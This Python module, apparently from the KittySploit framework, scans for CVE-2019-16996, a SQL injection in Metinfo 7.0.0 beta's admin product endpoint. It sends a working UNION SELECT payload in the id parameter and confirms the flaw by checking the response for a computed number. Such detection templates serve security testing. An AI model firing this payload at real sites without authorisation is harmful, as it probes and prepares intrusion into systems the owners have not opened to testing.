#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Metinfo 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Metinfo 7.0.0 beta - SQL Injection Detection',
        'description': 'Metinfo 7.0.0 beta is susceptible to SQL Injection in app/system/product/admin/product_admin.class.php via the admin/?n=product&c=product_admin&a=dopara&app_type=shop id parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'metinfo', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/XiaOkuoAi/XiaOkuoAi.github.io/issues/1',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-16996',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/StarCrossPortal/scalpel',
        ],
        'cve': 'CVE-2019-16996',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,25367*75643,5,6,7%20limit%205,1%20%23', allow_redirects=True)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('1918835981',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Metinfo 7.0.0 beta - SQL Injection detected",
                path='/admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,25367*75643,5,6,7%20limit%205,1%20%23',
            )
            return True
        return False

